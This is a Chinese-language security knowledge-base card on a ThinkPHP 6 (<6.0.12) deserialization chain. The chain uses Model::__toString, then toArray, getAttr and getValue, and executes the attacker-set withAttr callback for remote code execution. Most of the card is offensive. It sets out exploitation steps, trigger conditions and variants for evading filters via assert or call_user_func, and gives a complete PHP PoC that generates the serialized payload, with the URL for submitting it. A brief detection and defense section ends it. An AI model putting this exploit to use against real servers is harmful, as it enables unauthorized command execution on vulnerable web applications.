---
id: web-php-deserialization-thinkphp6-conversion-toarray-withattr-callback-rce
title: ThinkPHP 6 __toString 后链：Conversion.toArray 走 getAttr→getValue，withAttr 数组里的函数名被当回调执行
type: scenario
domain: web
path: web/php/deserialization
technique: thinkphp6-conversion-toarray-withattr-callback-rce
aliases:
- ThinkPHP6 withAttr 回调
- TP6 toArray getAttr getValue
- Model __toString RCE
- getValue closure 执行
- TP6 POP 后半链
tags:
- php
- thinkphp
- deserialization
- pop-chain
- tostring
- callback
- rce
- model
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
affected_versions: ThinkPHP < 6.0.12
verification:
  verified_by: verifier-T2-W3
  verified_at: '2026-11-08T12:42:33+08:00'
  notes: 已对照原文核对；__toString->toJson->toArray(visible 同名键)->getAttr->getData->getValue->withAttr 回调 system 与原文一致，最终 RCE 已由原文截图证明；未执行 PHP payload
---

## 一句话结论

ThinkPHP 6 的 `Model::__toString()` 实际走 `Conversion` trait 的 `toJson() → json_encode($this->toArray())`；`toArray()` 遍历 `$this->data` 的键，当该键同时存在于 `$this->visible` 时调用 `$this->getAttr($key)`，`getAttr → getValue` 里 `$closure = $this->withAttr[$fieldName]; $value = $closure($value, $this->data);` —— `withAttr` 是可控数组，于是把 `['cyz' => 'system']` 与 `data = ['cyz' => 'whoami']` 组合，就能在反序列化链末尾以 `system('whoami', $data)` 的形式执行任意函数，得到完整 RCE。

## 原理

- **__toString 不是终点**：`Conversion::__toString()` 返回 `$this->toJson()`，`toJson()` 返回 `json_encode($this->toArray(), $options)`；所以任何"到 __toString 为止"的前半链，实际最终落到 `toArray()`。
- **toArray 的三层分支**：`$data = array_merge($this->data, $this->relation); foreach ($data as $key => $val) { if ($val instanceof Model || ModelCollection) {...} elseif (isset($this->visible[$key])) { $item[$key] = $this->getAttr($key); } elseif (!isset($this->hidden[$key]) && !$this->hasVisible) { $item[$key] = $this->getAttr($key); } }`。两条可达路径都需要 `$key` 来自 `data`，第一条要求 `visible` 中存在同名键（值任意，只要是数组/标量即可），第二条要求 `hidden` 未命中且 `hasVisible` 为假——原文走第一条，因此 payload 里同时设置 `data` 与 `visible` 的同名键。
- **getAttr → getValue 的字段名解析**：`getAttr($name)` 先 `getData($name)` 取到 `$this->data[$name]`（`getData` 里 `getRealFieldName` 决定是否 `Str::snake`，`strict=true` 或 `convertNameToCamel=false` 时直接返回原名），再 `getValue($name, $value, $relation)`。`getValue` 内 `$fieldName = $this->getRealFieldName($name)`，`if (isset($this->withAttr[$fieldName]))` 成立后走 `else { $closure = $this->withAttr[$fieldName]; $value = $closure($value, $this->data); }`。
- **为什么等价于任意函数调用**：PHP 里数组元素若为字符串函数名，`$closure(...)` 就是变量函数调用（`system`、`exec`、`assert`、`call_user_func` 等）；第一个参数是 `$value`（即 `data[$key]`，可控），第二个参数是整个 `$data` 数组，`system` 只取第一个参数，故 `data['cyz']='whoami'` 即执行 `whoami`。
- **与 JSON 分支的区别**：若 `$fieldName` 同时在 `$this->json` 里且 `withAttr[field]` 是数组，会走 `getJsonValue` 而非直接回调；因此要保证该键**不在** `json` 数组里（默认空即满足）。
- **为什么能保持"看起来像正常模型"**：`data`/`withAttr`/`visible`/`json`/`strict` 都是 `Model` 的正常字段（数据库行数据、字段获取器、可见字段），payload 只是把它们设成攻击者想要的值，序列化串在结构上仍是合法的 `think\model\Pivot` 对象。
- **完整链形态**：`__destruct → save → updateData → checkAllowFields → db（字符串拼接） → __toString → toJson → toArray → getAttr → getValue → withAttr 回调`。前半段（到 `__toString` 触发）由 `Model` 的析构/保存路径提供，后半段（到命令执行）由 `Conversion`+`Attribute` 两个 trait 提供。

## 触发条件

- ThinkPHP 6.x，版本低于 6.0.12（与前半链同）；
- 可控 `unserialize` 入口，且未限制 `allowed_classes`；
- 能构造 `think\model\Pivot` 实例并设置 `data`/`visible`/`withAttr`/`strict`/`json` 等属性（私有属性需按类作用域写）；
- 目标未禁用对应执行函数（`disable_functions` 未含 `system` 等）；
- 前半链条件同时满足（`lazySave=true`、`withEvent=false`、`exists=true`、`force=true`、`data` 非空、`field`/`schema` 空）。

## 利用步骤

1. 确认版本与 `vendor/topthink/think-orm/src/model/concern/{Conversion,Attribute}.php` 存在且未被裁剪。
2. 构造 payload：`data = ['cyz' => 'whoami']`、`visible = ['cyz' => 1]`、`withAttr = ['cyz' => 'system']`、`strict = true`；同时设前半链属性（`exists/force/lazySave=true`、`withEvent=false`、`table` 为另一个 Pivot 实例用于拼接触发）。
3. `serialize` → `urlencode` → 提交到 `unserialize` 入口（原文测试地址 `/?data=<payload>`，返回 ThinkPHP 错误页但命令已执行，回显出现在系统提示中）。
4. 验证：`whoami` 有输出即成功；换 `withAttr` 为 `assert`/`exec` 或改用 `data` 承载更复杂命令（注意 `system` 会以 `$data` 数组作第二参数，多余参数被忽略）。
5. 若被拦：把函数名拆分成变量拼接（`withAttr` 存 `'sys'.'tem'` 的运行时值不可能，因为序列化是静态字符串——改用 `assert` + `data` 里放完整 PHP 代码，或把 `withAttr` 设为 `call_user_func` 并让 `data` 结构承载数组参数）。

## PoC

```php
<?php
namespace think\model\concern;

trait Attribute {
    private $data = ['cyz' => 'whoami'];
    private $withAttr = ['cyz' => 'system'];
}

trait ModelEvent {
    protected $withEvent = true;
}

namespace think;

abstract class Model {
    use model\concern\Attribute;
    use model\concern\ModelEvent;

    private $exists;
    private $force;
    private $lazySave;
    protected $suffix;

    function __construct($a = '') {
        $this->exists = true;
        $this->force = true;
        $this->lazySave = true;
        $this->withEvent = false;
        $this->suffix = $a;
    }
}

namespace think\model;

use think\Model;

class Pivot extends Model {}

echo urlencode(serialize(new Pivot(new Pivot())));
```

```text
# 提交（payload 为上面的 urlencode 结果；目标入口处 unserialize($input)）
/?data=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A... 
```

执行链（后半段）：

```text
__toString() → toJson() → json_encode(toArray())
toArray(): foreach data as key => val
  → isset($this->visible[$key]) 成立
    → getAttr($key)
      → getData($key) 得到 $value = data[$key]
      → getValue($key, $value, false)
        → isset($this->withAttr[$fieldName]) 成立
          → $closure = withAttr[$fieldName]      // 'system'
          → $closure($value, $this->data)        // system('whoami', [...])
```

## 变体与关联

- 变体：不设 `visible`，改走 `elseif (!isset($this->hidden[$key]) && !$this->hasVisible)` 分支（需保证 `hidden` 无同名键、`hasVisible` 为假），同样到 `getAttr`。
- 变体：`withAttr` 设为 `assert`，`data` 里放完整 PHP 代码字符串；或 `withAttr` 设为 `call_user_func` 并利用第二个参数 `$this->data` 作为参数数组（`call_user_func($value, $this->data)` 语义需实测，属变体方向）。
- 变体：把 `strict=false` + `convertNameToCamel` 打开，键名会走 `Str::snake`，需同步调整 `data`/`withAttr`/`visible` 的键名写法（如 `myKey` → `my_key`）。
- 变体：`getValue` 里先查 `array_key_exists($fieldName, $this->get)` 会提前 return，构造时需保证 `get` 不含该键。
- 关联：[[web-php-deserialization-thinkphp6-model-destruct-tostring-chain]]（前半链：`__destruct → save → updateData → checkAllowFields → db` 的拼接触发 `__toString`；本卡是其后半段，两卡组合为完整 RCE）。
- 关联：[[web-php-deserialization-destruct-tostring-htmlspecialchars-file-read]]（通用 `__destruct → __toString` 链式思路的可比案例）。
- 边界：6.0.12 起前半链被修；`withAttr` 回调依赖 `strict`/`convertNameToCamel` 与 `json` 的取值；`json_encode` 过程中若回调抛异常会中断。

## 检测与防御

- 检测：序列化串中出现 `withAttr` + 函数名字符串、`visible` 与 `data` 同名键；运行时监控 `Model::toArray`/`getAttr` 后出现的变量函数调用（`system`/`exec`/`assert` 等）。
- 防御：升级到 6.0.12+；`unserialize` 使用 `allowed_classes` 白名单（禁止 `think\*`）；不要对用户输入直接反序列化；`disable_functions` 覆盖执行类函数；对序列化对象做类名/属性名检测（`withAttr` 出现字符串回调即高危）。
